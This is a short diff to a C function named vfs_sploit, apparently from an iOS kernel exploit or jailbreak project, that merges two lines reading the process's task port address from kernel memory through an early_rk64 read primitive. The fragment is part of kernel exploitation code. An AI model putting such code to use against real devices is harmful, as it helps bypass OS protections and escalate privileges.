@@ -885,8 +885,7 @@ bool vfs_sploit()
     uint64_t task_kmsg = early_rk64(canary_port_kaddr + koffset(KSTRUCT_OFFSET_IPC_PORT_IKMQ_BASE));
     LOG("task_kmsg: %016llx", task_kmsg);
 
-    uint64_t task_port_kaddr = early_rk64(host_kmsg + 0xac);
-    cached_task_self_addr = task_port_kaddr;
+    uint64_t task_port_kaddr = cached_task_self_addr = early_rk64(host_kmsg + 0xac);
 
     LOG("our task port is at %016llx", task_port_kaddr);
 
